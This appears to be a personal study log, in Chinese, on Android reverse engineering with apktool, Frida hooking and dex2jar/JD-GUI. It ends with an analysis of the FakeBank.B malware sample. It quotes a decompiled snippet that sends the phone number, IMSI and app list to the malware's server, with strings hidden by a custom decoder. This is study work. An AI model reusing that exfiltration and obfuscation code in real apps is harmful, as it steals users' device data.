### Parktsai 學習紀錄


```
20180424
今天開始接觸人生第一次的apk逆向工程,最主要流程如下
1.了解APK建立流程
2.實作Reverse apk

依據下圖來看,主要可以分成3個流程
建立APK---> 申請金鑰（RSA）--->簽章

感覺上簽章在這裡的目的是拿來證明開發者身份,但是在今天的實作中會進行重新簽章的動作,是否是一種規避版權的方法？



想學習者可以學習我大大KunYuChen 這篇
https://github.com/18z/apk-re-forfun/blob/master/02/apktool.md
```

![apktool-repackage](https://github.com/parkmftsai/Reverse-apk-research/blob/master/Image/build.png)
<br >


```
20180425
Frida 研究 
1.PC上Frida環境建立
可參考這篇https://www.codemetrix.net/hacking-android-apps-with-frida-1/

2.android模擬器環境（genymotion）
  這有點麻煩,搞了有點久,尤其是裝完android之後透過frida下以下指令時
  會出現
  List of devices attached
  adb server is out of date.  killing...
  cannot bind 'tcp:5037': Address already in use
  ADB server didn't ACK
  會讓人有點生氣╰（‵□′）╯
  一開始以為是有某個process佔了port 5037,殺了一堆process之後還是給你繼續連
  後來看到底下這篇
  
  
  https://blog.csdn.net/hai29785/article/details/52370106
  原來genymotion與pc不是用同一個sdk中的adb,所以某個adb剛好佔住port 5037
  所以只要把genymotion的adb路徑改成跟PC一樣就行囉^_^
  
  在此附上frida-server網址
  https://github.com/frida/frida/releases
  須注意pc上的frida版本與frida-server版本須一致
  yed:
     frida hook實作一遍
```
```
20180426
1.Frida hook 研究 
Frida hook的對象主要以process,原理在於將javascript code inject to any process
相關範例在20180426research資料夾內
Question: 
 如果要植入code,為何植入的是javascript code,python 不能？

可參考https://www.frida.re/docs/javascript-api/
  yed:
     frida hook to android emulator process 實作一遍
  




```
```
20180427~20180501

這陣子在看frida javascript api的使用
官方的介紹有點含糊,看起來與操作起來還是似懂非懂

官方網頁:https://www.frida.re/docs/javascript-api/
,但是這個新發現網頁給的範例似乎有一個脈落可尋,或許可以幫助我更了解frida的作用
http://ahageek.com/blog/wooyun_articles/Frida-%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%AF%87.html


yed:
     參考並實做一遍上述網頁範例

```
```
20180502 and 20180504
5/2我突然想到一個問題，hook的操作是透過記憶體位址控制的，有沒有一種情況，在使用hook的時候，只要改動一個數值
被hook的process對應的變數，裡頭的數值也會改變？
於是我愉快的玩了一個測試
測試檔案在20180504research
在hook.py 裡頭有這段
var f = new NativeFunction(ptr(0x400566), 'int', ['int','pointer']);
其中0x400566為 目標function的 address
整句的意思是，我按照目標function的格式，也建立了一個function要hook用的
接著我們在hello.py裡頭有個條件式
if(n==10000) 
  ....以下省略
  
結果一測試下去，very nice ，數值不會改變，由此可以證明一點process的變數歸process, hook的還是hook的

5/4
今天我同事大大KunYuChen提出一個問題，在open底下
"""
根据packages.xml中指定的codePath，创建一个目录，apk会被命名成base.apk并拷贝到此，其中lib目录用来存放native库。
這個 base.apk 有無可能跟原本 apk 有差異呢？

"""
這感覺有點像5/2結論的延伸，在此提出一個假設
除非hook會把當前hook的記憶體狀態，把裡頭的hook function也寫進去，才可能
yed:
     驗證這個假設

```
```
5/7
今天首先要驗證兩個問題
1.hook一個process,其數值的確改變,但位址是否也是process的function address?
2.透過frida-trace android apk後，會產生以下這種狀況
 frida-trace -i "open" -U xxxxx 
 open(pathname="/data/app/com.example.ttc.myapplication-2/base.apk", flags=0x0)
 open(pathname="/data/app/com.example.ttc.myapplication-2/oat/x86/base.art", flags=0x0)
 open(pathname="/data/app/com.example.ttc.myapplication-2/base.apk", flags=0x0)
 我們可以發現，使用 frida-trace -i "open" -U 會產生base.apk，這個apk是從你hook的那個apk,透過frida-trace -i "open" -U
 產生的
 問題點在於base.apk是否會與之前hook的那隻apk一樣？ 如果不一樣又是哪邊不一樣？
 
 先回答第一個問題
 我們測試的code與20180504research相似
 只是我們把
 printf ("number is %d\n",n);
 改成
 printf ("number is %p\n", &n);
 以方便看address變化
 執行程式之後
 n的位址為0x7fff81af929c
 hook後n的位址為0x7f9349ffa33c
 很明顯看出，hook做的動作應是先複製一份process 裡頭指定的function,然後在執行時，把指標指向hook複製的function
 
 最後回答第二個問題
 首先我們先計算要丟進android模擬器執行的apk的 hash值，工具使用md5sum，這個android裡頭也有裝
 然後再計算base.py的hash值，也是使用md5sum
 然後比較一下兩者的hash值
 xxx.apk的hash值 01a9ba0410a46dd590918d1724ab6387 
 base.apk的hash值 01a9ba0410a46dd590918d1724ab6387 
 兩者數值相同，得證，兩個檔案都一樣
 Question ： 多產生一份相同的apk意義何在？
 
 yed: 驗證hook android是否也能像hook c語言寫的process那樣，用process裡的function
 怎麽做？ 語法表示？
 
```
```
20180509
為了學習如何分析malware apk，首先我需要一堆參考資料（如何攻擊？），最好是有那種很多不同的malware apk
可以看，果不其然以下project給了我不少幫助
https://github.com/parkmftsai/android-malware
這位大大蒐集了多個不同攻擊手法的apk
其中BreakBottleneck這個資料夾有一個Break Bottleneck.pdf可以看
內容大概在敘述BreakBottleneck內的所有apk攻擊方式，大致上都是以欺騙為主的攻擊，講述的還算完整
，也給了我一些不錯的思考方向，不過，我尚未看完＝＝
yed:把他看完，然後選一個apk做逆向工程
```
```
20180510
終於把Break Bottleneck.pdf看完了，
結論：
根據百度的調查，那些有彩蛋的malware apk很多時候都是第三方apk（想成沒放在play商店的apk），
而且透過藍芽或是femticell傳送的惡意程式，有越來越多的趨勢。
所以我們可以簡短的說,Break Bottleneck.pdf裡頭記載的攻擊，很多時候都是使用者沒有良好的資安思維造成的，
在智慧型手機興起的年代，如何向下紮根資訊安全教育，絕對會是21世紀最重要的問題。

再來，做個逆向工程，我選擇FakeBank.B這個apk測試，還是選用apktool來玩，
但是，我不太會看smali檔＝＝
於是乎，我找了一些方式，看看有沒有好用的工具可以協助我，還真的有喔
我使用dex2jar＋JD-GUI
dex2jar可以將apk裡頭的class.dex檔，轉成jar檔
然後透過JD-GUI將此jar檔打開，就可以讀java檔囉
最後在讀java code的過程中
 String str = Config.get(CoreService.mContext, run("U=Tko6Xm/dU3RgE3llt5Mz+f"), Config.SERVER_HOST) + Config.SERVER_ADDRESS + run("Q=AHRwcbACkJFQUJQTABjWd2TzKg") + Config.getPhoneNumber(App.this.mContext).trim() + run("==MwbWJiQ0EBktx0MwZz") + Config.getIMSI(App.this.mContext).trim() + run("==QvbWInLAdhQ0QBKIokMwei") + URLEncoder.encode(App.this.getApps().trim());
感覺這段有問題阿XD

```
```
20180514
在FakeBank.B裡頭，這段程式碼裡頭，

public void run()
{
String str = Config.get(CoreService.mContext, run("U=Tko6Xm/dU3RgE3llt5Mz+f"), Config.SERVER_HOST) + Config.SERVER_ADDRESS          + run("Q=AHRwcbACkJFQUJQTABjWd2TzKg") + Config.getPhoneNumber(App.this.mContext).trim() + run("==MwbWJiQ0EBktx0MwZz") + Config.getIMSI(App.this.mContext).trim() + run("==QvbWInLAdhQ0QBKIokMwei") + URLEncoder.encode(App.this.getApps().trim());
System.out.println(run("s0tIdA917ARdYjcFBTVGRiRbQ3QiVzBiTvbsrDNFAUfaKEJF") + str);
    try
    {
      new Connect().getHttpConnection(str);
      return;
    }
    catch (Exception localException) {}
}
run("U=Tko6Xm/dU3RgE3llt5Mz+f")
run("Q=AHRwcbACkJFQUJQTABjWd2TzKg")
run("==MwbWJiQ0EBktx0MwZz")
.
.
.
這些是透過一個Function叫private static String run(String paramAnonymousString)進行解密的
方法看起來是自己硬刻出來的，目的應是在於躲過靜態分析用，因為那些字串都是亂碼，然後解密的過程在記憶體裡頭操作，感覺與加殼有點類似。

以下這篇有點意思，或許我可以改個程式碼，拿來監看某個東東XD
https://4hou.win/wordpress/?p=16252

yed 參考程式碼，看看能不能做個有趣的東西
```
